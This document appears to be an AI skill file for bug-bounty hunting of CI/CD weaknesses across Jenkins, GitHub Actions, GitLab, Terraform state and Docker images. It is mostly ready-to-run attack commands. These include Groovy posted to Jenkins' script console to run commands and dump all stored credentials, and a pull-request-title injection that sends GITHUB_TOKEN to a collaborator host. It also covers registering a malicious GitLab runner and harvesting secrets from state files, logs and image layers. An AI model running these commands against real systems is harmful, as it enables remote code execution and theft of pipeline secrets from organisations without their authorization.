---
name: hunt-cicd
description: Hunt CI/CD pipeline vulnerabilities — GitHub Actions workflow injection (pull_request_target + untrusted input), Jenkins script console RCE, GitLab CI runner token exposure, Terraform state file leakage, artifact leakage, GitHub Actions secrets in logs, pipeline environment variable disclosure. Use when target has public GitHub org, exposed CI dashboards, or build artifacts are reachable.
sources: hackerone_public, github_security_research, cve_database
report_count: 18
---

# HUNT-CICD — CI/CD Pipeline Security

## Crown Jewel Targets

Jenkins `/script` console accessible = immediate RCE. GitHub Actions `pull_request_target` with untrusted input = secret exfil from fork PRs.

**Highest-value findings:**
- **Jenkins Script Console** — Groovy script execution on Jenkins server → full RCE → extract all credentials/secrets
- **GitHub Actions `pull_request_target` injection** — workflow triggered on fork PR with `${{ github.event.pull_request.title }}` in shell command → attacker PR title = command injection → steal repo secrets
- **GitLab Runner registration token** — found in config/logs → register own runner → steal CI secrets on next pipeline run
- **Terraform state leakage** — `.tfstate` file in public S3/GCS → all infrastructure credentials, DB passwords, API keys
- **GitHub Actions artifact leakage** — build artifacts publicly downloadable → binaries with embedded secrets, env vars in logs

---

## Phase 1 — Jenkins Detection & Script Console

```bash
# Jenkins fingerprint
curl -sI "https://$TARGET/jenkins" | grep -i "x-jenkins\|hudson"
curl -sI "https://$TARGET/" | grep -i "x-jenkins"
curl -s "https://$TARGET/jenkins/api/json" | python3 -m json.tool 2>/dev/null | head -10

# Common Jenkins paths
for path in /jenkins /jenkins/ /ci /build /bamboo "/:8080" "/:8443"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://$TARGET$path")
  [ "$STATUS" != "404" ] && [ "$STATUS" != "000" ] && echo "$path: $STATUS"
done

# Script console (unauthenticated access = Critical)
curl -s "https://$TARGET/jenkins/script" | grep -i "Script Console\|Groovy"
curl -s "https://$TARGET/script" | grep -i "Script Console\|Groovy"

# Execute Groovy script
curl -s -X POST "https://$TARGET/jenkins/scriptText" \
  --data-urlencode 'script=println("id".execute().text)' | head -5

# Dump all credentials from Jenkins
curl -s -X POST "https://$TARGET/jenkins/scriptText" \
  --data-urlencode 'script=
import com.cloudbees.plugins.credentials.*
import com.cloudbees.plugins.credentials.common.*
def creds = CredentialsProvider.lookupCredentials(StandardCredentials.class)
creds.each { println it.id + " : " + (it.hasProperty("secret") ? it.secret : "") }
'
```

---

## Phase 2 — GitHub Actions Injection

```bash
# Find repos with pull_request_target + untrusted input
# Search target org's workflows
gh api graphql -f query='
{
  organization(login: "TARGET_ORG") {
    repositories(first: 100) {
      nodes {
        name
        defaultBranchRef { name }
      }
    }
  }
}' 2>/dev/null | jq -r '.data.organization.repositories.nodes[].name' | while read repo; do
  # Check for pull_request_target workflows
  gh api "repos/TARGET_ORG/$repo/contents/.github/workflows" 2>/dev/null | \
    jq -r '.[].name' | while read wf; do
    gh api "repos/TARGET_ORG/$repo/contents/.github/workflows/$wf" 2>/dev/null | \
      jq -r '.content' | base64 -d 2>/dev/null | \
      grep -l "pull_request_target" && echo "CANDIDATE: $repo/$wf"
  done
done

# Grep downloaded workflow files for injection patterns
grep -r "pull_request_target" .github/workflows/ --include="*.yml" 2>/dev/null | head -20
grep -r 'github.event.pull_request' .github/workflows/ --include="*.yml" 2>/dev/null | \
  grep -v "# " | head -20

# INJECTION PATTERN (vulnerable):
# on: pull_request_target
# steps:
#   - run: echo "${{ github.event.pull_request.title }}"  ← INJECTION POINT
# 
# ATTACK: PR title = "; curl COLLAB_HOST/secrets?d=$(cat $GITHUB_TOKEN);"
```

---

## Phase 3 — GitHub Actions Secrets in Logs

```bash
# Check if GitHub Actions logs are publicly accessible
# Some orgs have public repos with exposed runs

# List recent workflow runs
gh api "repos/TARGET_ORG/TARGET_REPO/actions/runs" 2>/dev/null | \
  jq '.workflow_runs[:5] | .[] | {id: .id, name: .name, status: .status}'

# Download logs for a run
gh api "repos/TARGET_ORG/TARGET_REPO/actions/runs/RUN_ID/logs" 2>/dev/null > /tmp/run-logs.zip
unzip /tmp/run-logs.zip -d /tmp/run-logs/
grep -riE "(secret|password|token|key|credential)" /tmp/run-logs/ | grep -v "::add-mask::"

# Check artifacts
gh api "repos/TARGET_ORG/TARGET_REPO/actions/runs/RUN_ID/artifacts" 2>/dev/null
```

---

## Phase 4 — GitLab CI Misconfigurations

```bash
# GitLab Runner registration token (allows registering attacker runner)
# Often found in:
# - /etc/gitlab-runner/config.toml (if LFI/RFI)
# - GitLab settings page (screenshot in docs, Slack, etc.)
# - Error logs
# - CI/CD variables if misconfigured

# Check for exposed GitLab instances
curl -s "https://$TARGET/gitlab/" | grep -i "GitLab"
curl -s "https://$TARGET/-/admin/runners" | grep -i "token\|runner" 

# API access with default/stolen token
curl -s "https://$TARGET/api/v4/runners?type=instance_type" \
  -H "PRIVATE-TOKEN: TOKEN"

# Check GitLab CI config for secret exposure
curl -s "https://raw.githubusercontent.com/TARGET_ORG/TARGET_REPO/main/.gitlab-ci.yml"
```

---

## Phase 5 — Terraform State File Leakage

```bash
# Terraform state files in public cloud storage
# Try common bucket/path patterns
TARGETS=(
  "https://TARGET.s3.amazonaws.com/terraform.tfstate"
  "https://s3.amazonaws.com/TARGET-terraform/terraform.tfstate"
  "https://TARGET-infra.s3.amazonaws.com/terraform.tfstate"
  "https://storage.googleapis.com/TARGET-terraform/terraform.tfstate"
  "https://TARGET.blob.core.windows.net/terraform/terraform.tfstate"
)

for URL in "${TARGETS[@]}"; do
  STATUS=$(curl -s -o /tmp/tfstate_test -w "%{http_code}" "$URL")
  if [ "$STATUS" = "200" ]; then
    echo "[+] FOUND: $URL"
    cat /tmp/tfstate_test | python3 -m json.tool 2>/dev/null | \
      grep -i "password\|secret\|key\|token" | head -20
  fi
done

# Also check .terraform directory in repos
gh search code --owner TARGET_ORG "terraform.tfstate" --limit 10 2>/dev/null
gh search code --owner TARGET_ORG "backend \"s3\"" --limit 10 2>/dev/null
```

---

## Phase 6 — Build Artifact Analysis

```bash
# Download publicly available build artifacts
# GitHub: Actions → Artifacts (if public repo)
# Docker Hub: pull image and inspect layers

# Docker image secret scanning
docker pull TARGET_ORG/TARGET_IMAGE:latest 2>/dev/null
docker history TARGET_ORG/TARGET_IMAGE:latest 2>/dev/null | grep -i "env\|key\|secret\|pass"
docker inspect TARGET_ORG/TARGET_IMAGE:latest | python3 -m json.tool | grep -i "env\|secret"

# Extract all layers
docker save TARGET_ORG/TARGET_IMAGE:latest | tar -xvC /tmp/image-layers/
find /tmp/image-layers/ -name "*.json" | xargs grep -l "secret\|password\|key"

# Scan with trufflehog
trufflehog docker --image TARGET_ORG/TARGET_IMAGE:latest 2>/dev/null
```

---

## Chain Table

| CI/CD finding | Chain to | Impact |
|--------------|----------|--------|
| Jenkins script console | Dump all credentials from credential store | Critical |
| GitHub Actions injection | Exfil `GITHUB_TOKEN` or org secrets | Critical |
| Terraform state exposed | All infrastructure passwords/API keys | Critical |
| GitLab runner token | Register malicious runner → steal pipeline secrets | Critical |
| Docker image secrets | Cloud credentials, DB passwords | High/Critical |
| Actions logs with secrets | Direct credential use | High |

---

## Validation

✅ Jenkins: Groovy `"id".execute().text` returns `uid=xxx`
✅ Actions injection: COLLAB receives `GITHUB_TOKEN` from malicious PR
✅ Terraform state: JSON file contains resource passwords/API keys in plaintext
✅ Docker image: layer inspection or trufflehog reveals embedded secrets

**Severity:**
- Jenkins script console: Critical
- Actions injection → secret exfil: Critical
- Terraform state with creds: Critical
- Docker image with secrets: High/Critical
